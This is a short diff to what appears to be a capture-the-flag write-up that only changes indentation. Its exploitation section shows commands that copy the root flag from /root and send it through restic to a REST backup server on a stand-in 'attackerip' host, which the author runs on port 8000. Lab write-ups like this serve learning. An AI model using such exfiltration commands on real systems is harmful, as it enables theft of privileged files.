@@ -77,10 +77,10 @@ Data exfil to my server → /root access → root flag
 ## 🧪 Exploitation
 - Created a new repo in the cron job panel.
 - Wrote a script to dump /root into a backup:
-```bash
-cp /root/root.txt /tmp/output.txt
-restic -r rest:http://attackerip:8000 backup /tmp
-```
+  ```bash
+  cp /root/root.txt /tmp/output.txt
+  restic -r rest:http://attackerip:8000 backup /tmp
+  ```
 - Hosted a rest server:
   ```bash
   rest-server --path /var/restic --listen :8000
